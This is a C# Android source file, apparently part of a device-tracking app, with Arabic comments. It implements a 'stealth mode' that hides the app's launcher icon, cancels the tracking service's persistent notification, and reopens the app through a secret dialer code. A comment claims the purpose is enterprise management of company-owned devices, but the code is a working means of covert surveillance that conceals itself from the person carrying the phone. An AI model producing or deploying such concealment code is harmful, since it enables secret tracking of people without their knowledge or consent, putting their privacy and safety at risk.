using Android.Content;
using Android.Content.PM;

namespace DeviceTracker.Services;

/// <summary>
/// التحكم بوضع الاختفاء (Stealth Mode).
///
/// الميزات:
/// - إخفاء أيقونة التطبيق من قائمة التطبيقات (Launcher)
/// - إخفاء الإشعار الدائم للخدمة
/// - تشغيل الخدمة بصمت بدون أي مؤشر مرئي
///
/// ملاحظة مهمة: هذا لأغراض إدارة الأجهزة المؤسسية (Enterprise MDM)
/// حيث الأجهزة مملوكة للشركة وليست شخصية.
/// </summary>
public static class StealthService
{
    private const string StealthPrefKey = "stealth_mode";

    /// <summary>
    /// هل وضع الاختفاء مفعل؟
    /// </summary>
    public static bool IsStealthEnabled =>
        Preferences.Get(StealthPrefKey, false);

    /// <summary>
    /// إخفاء أيقونة التطبيق تماماً من الـ Launcher
    /// </summary>
    public static void HideAppIcon(Context context)
    {
        try
        {
            var component = new ComponentName(context,
                Java.Lang.Class.FromType(typeof(MainActivity)));

            var pm = context.PackageManager;
            pm?.SetComponentEnabledSetting(component,
                ComponentEnabledState.Disabled,
                ComponentEnableOption.DontKillApp);

            Preferences.Set(StealthPrefKey, true);

            System.Diagnostics.Debug.WriteLine(
                "[Stealth] App icon hidden");
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine(
                $"[Stealth] Hide error: {ex.Message}");
        }
    }

    /// <summary>
    /// إظهار أيقونة التطبيق مرة أخرى
    /// </summary>
    public static void ShowAppIcon(Context context)
    {
        try
        {
            var component = new ComponentName(context,
                Java.Lang.Class.FromType(typeof(MainActivity)));

            var pm = context.PackageManager;
            pm?.SetComponentEnabledSetting(component,
                ComponentEnabledState.Enabled,
                ComponentEnableOption.DontKillApp);

            Preferences.Set(StealthPrefKey, false);

            System.Diagnostics.Debug.WriteLine(
                "[Stealth] App icon shown");
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine(
                $"[Stealth] Show error: {ex.Message}");
        }
    }

    /// <summary>
    /// إخفاء الإشعار الدائم للخدمة (إذا كان وضع الاختفاء مفعلاً)
    /// </summary>
    public static void HideServiceNotification(Context context)
    {
        try
        {
            var nm = context.GetSystemService(Context.NotificationService)
                as Android.App.NotificationManager;

            // إزالة الإشعار (إذا أردنا إخفاءه)
            nm?.Cancel(1001); // NotificationId من ForegroundService
        }
        catch { }
    }

    /// <summary>
    /// فتح التطبيق عبر كود سري (بدون أيقونة)
    /// يمكن استدعاؤه عبر Dialer: *#*#1234#*#*
    /// </summary>
    public static void OpenViaSecretCode(Context context, string code)
    {
        // يستقبل الـ Secret Code ويعيد فتح النشاط
        var intent = new Intent(context,
            Java.Lang.Class.FromType(typeof(MainActivity)));
        intent.SetFlags(ActivityFlags.NewTask);
        context.StartActivity(intent);
    }
}
